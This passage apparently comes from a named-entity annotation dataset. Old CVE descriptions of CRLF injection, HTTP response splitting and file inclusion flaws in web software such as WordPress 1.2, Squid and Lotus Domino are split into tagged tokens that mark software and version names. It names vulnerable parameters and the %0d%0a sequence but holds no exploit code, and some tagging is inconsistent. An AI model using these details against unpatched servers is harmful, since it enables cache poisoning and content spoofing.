software O O
unusable O O
. O O

By O O
injecting O O
a O O
local O O
path O O
name O O
into O O
$ O O
_SERVER O O
[ O O
HTTP_ACCEPT_LANGUAGE O O
] O O
, O O
an O O
attacker O O
can O O
now O O
include O O
arbitrary O O
files O O
. O O

This O O
issue O O
was O O
discussed O O
in O O
CVE-2005-0870 O O
and O O
still O O
exists O O
. O O

Advisory O O
22/2005 O O
: O O
Multiple O O
vulnerabilities O O
in O O
phpSysInfo O O

HTTP O O
response O O
splitting O O
vulnerability O O
in O O
language_select.asp O O
in O O
ASP S-vulnerable_software pair_0
Nuke S-vulnerable_software pair_0
0.80 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
spoof O O
web O O
content O O
and O O
poison O O
web O O
caches O O
via O O
CRLF O O
( O O
% O O
0d O O
% O O
0a O O
) O O
sequences O O
in O O
the O O
LangCode O O
parameter O O
. O O

HTTP O O
response O O
splitting O O
vulnerability O O
in O O
the O O
@ O O
SetHTTPHeader O O
function O O
in O O
Lotus S-vulnerable_software pair_0
Domino S-vulnerable_software pair_0
6.5.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
6.0.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.0.5 S-vulnerable_version pair_0
allows O O
attackers O O
to O O
poison O O
the O O
web O O
cache O O
via O O
malicious O O
applications O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
search.php O O
in O O
Phorum S-vulnerable_software pair_0
5.0.14a S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
via O O
the O O
body O O
parameter O O
, O O
which O O
is O O
included O O
in O O
the O O
resulting O O
Location O O
header O O
. O O

Squid S-vulnerable_software pair_0
2.5 S-vulnerable_version pair_0
up S-vulnerable_version pair_0
to S-vulnerable_version pair_0
2.5.STABLE7 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
poison O O
the O O
cache O O
via O O
an O O
HTTP O O
response O O
splitting O O
attack O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
calendar.php O O
in O O
DCP-Portal S-vulnerable_software pair_0
5.3.2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
to O O
spoof O O
web O O
content O O
and O O
poison O O
web O O
caches O O
via O O
CRLF O O
( O O
% O O
0d O O
% O O
0a O O
) O O
sequences O O
in O O
the O O
PHPSESSID O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
PD9 S-vulnerable_software pair_0
Software S-vulnerable_software pair_0
MegaBBS S-vulnerable_software pair_0
2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
2.1 S-vulnerable_version pair_0
allows O O
attackers O O
to O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
fid O O
parameter O O
in O O
a O O
writenew O O
action O O
to O O
thread-post.asp O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
down.asp O O
for O O
Snitz S-vulnerable_software pair_0
Forums S-vulnerable_software pair_0
2000 S-vulnerable_version pair_0
3.4.04 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
to O O
modify O O
expected O O
HTML O O
content O O
from O O
the O O
server O O
via O O
the O O
location O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Serendipity S-vulnerable_software pair_0
before S-vulnerable_version pair_0
0.7rc1 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
to O O
modify O O
expected O O
HTML O O
content O O
from O O
the O O
server O O
via O O
the O O
url O O
parameter O O
in O O
( O O
1 O O
) O O
index.php O O
and O O
( O O
2 O O
) O O
exit.php O O
, O O
or O O
( O O
3 O O
) O O
the O O
HTTP O O
Referer O O
field O O
in O O
comment.php O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
wp-login.php O O
in O O
WordPress S-vulnerable_software pair_0
1.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
to O O
modify O O
expected O O
HTML O O
content O O
from O O
the O O
server O O
via O O
the O O
text O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
subscribe_thread.php O O
in O O
w-Agora S-vulnerable_software pair_0
4.1.6a S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
to O O
modify O O
expected O O
HTML O O
content O O
from O O
the O O
server O O
via O O
the O O
thread O O
parameter O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
index.php O O
in O O
phpWebSite S-vulnerable_software pair_0
0.9.3-4 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
to O O
modify O O
expected O O
HTML O O
content O O
from O O
the O O
server O O
via O O
the O O
block_username O O
parameter O O
in O O
the O O
user O O
module O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
login.php O O
in O O
WebCalendar O O
allows O O
remote O O
attackers O O
to O O
inject O O
CRLF O O
sequences O O
via O O
the O O
return_path O O
parameter O O
and O O
perform O O
HTTP O O
Response O O
Splitting O O
attacks O O
to O O
modify O O
expected O O
HTML O O
content O O
from O O
the O O
server O O
. O O
